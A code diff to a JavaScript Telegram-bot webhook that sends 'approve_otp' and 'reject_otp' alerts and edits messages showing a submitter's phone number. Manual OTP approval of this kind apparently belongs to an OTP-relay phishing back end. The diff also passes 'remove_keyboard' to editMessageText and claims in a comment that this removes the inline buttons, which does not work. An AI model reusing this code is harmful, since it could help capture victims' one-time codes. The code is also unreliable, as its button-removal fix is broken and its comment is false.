@@ -127,7 +127,7 @@ export default async function handler(req, res) {
         if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès ! Forfait activé.';
         if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+        const answerRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -135,9 +135,14 @@ export default async function handler(req, res) {
             text: alertMsg,
             show_alert: true,
           }),
-        }).catch((err) => console.warn('[Webhook] answerCallbackQuery error:', err));
+        });
 
-        // Update message text in Telegram (async, don't wait)
+        const answerData = await answerRes.json();
+        if (!answerData.ok) {
+          console.error('[Webhook] answerCallbackQuery failed:', answerData);
+        }
+
+        // Update message text in Telegram AND REMOVE BUTTONS
         if (msgId && chatId) {
           let updatedText = '';
           const phone = data.fullPhone || data.phone || 'Inconnu';
@@ -193,7 +198,8 @@ export default async function handler(req, res) {
           }
 
           if (updatedText) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+            console.log('[Webhook] Updating message and removing buttons for:', recordId);
+            const editRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
@@ -201,8 +207,16 @@ export default async function handler(req, res) {
                 message_id: msgId,
                 text: updatedText,
                 parse_mode: 'HTML',
+                reply_markup: { remove_keyboard: true }, // This removes the buttons!
               }),
-            }).catch((err) => console.warn('[Webhook] editMessageText error:', err));
+            });
+
+            const editData = await editRes.json();
+            if (!editData.ok) {
+              console.error('[Webhook] editMessageText failed:', editData);
+            } else {
+              console.log('[Webhook] Message updated successfully, buttons removed');
+            }
           }
         }
 
